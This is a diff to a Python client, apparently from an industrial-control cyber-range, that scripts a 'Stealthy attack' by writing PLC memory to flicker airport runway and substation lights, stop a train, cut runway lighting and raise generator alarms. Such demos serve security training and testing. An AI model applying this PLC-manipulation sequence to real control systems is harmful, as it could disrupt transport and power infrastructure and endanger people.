@@ -50,6 +50,7 @@ CSV_VAL = 'pwrSubParm.csv'
 #   M10 -> Q0.1 track A pwr
 #   M20 -> Q0.2 track B pwr
 #   M60 -> Q0.3 city LED
+#   M50 -> All power down.
 
 #--------------------------------------------------------------------------
 #--------------------------------------------------------------------------
@@ -410,22 +411,26 @@ class pwrGenClient(object):
             return None
         elif threadName == 'A;3':
             self.subTHActFlag = True
-            print(">>> Start the Substation attack.")
+            print(">>> Start the Stealthy attack.")
             self.setGenState("49.89:11.00:red:red:red:red:off:on")
             time.sleep(1)
             if self.plc1.connected: self.plc1.writeMem('M60', 1)               
             time.sleep(1)
+
             for i in range(15):
                 val = i%2
+                # 1. Flickering of Airport runway light
                 if self.plc1.connected:
                     self.plc1.writeMem('M0', val)
                     time.sleep(0.3)
                     self.plc1.writeMem('M10', val)
                     time.sleep(0.3)
+                # 2. Flickering of substation light(optional)
                 if self.plc2.connected:
                     v = True if val == 1 else False
                     self.plc2.writeMem('qx0.0', v)
                     time.sleep(0.3)
+                # 3.Train stop/start moving
                 if self.plc3.connected:
                     self.plc3.writeMem('M10', 0)
                     time.sleep(0.5)
@@ -435,12 +440,19 @@ class pwrGenClient(object):
                 if i == 10:
                     self.setGenState("50.00:11.00:amber:amber:amber:amber:off:on")
 
-            time.sleep(0.3)
+            # 3.Switch off Airport runway light
+            self.plc1.writeMem('M10', 0)
+            # 4.Wait for 10 secs
+            time.sleep(10)
+            # Generater show alert
             self.setGenState("51.20:11.00:red:red:red:red:off:off")
+            # 5. Switch off Train
             self.plc3.writeMem('M10', 0)
-            self.plc2.writeMem('qx0.2', True)
+            # 6. Wait for 10 secs
+            time.sleep(10)
+            # self.plc2.writeMem('qx0.2', True)
+            # 7.City light change to red. 
             self.plc3.writeMem('M60', 1)
-
             # self.autoCtrl = True
         self.atkLocker = False
         return None
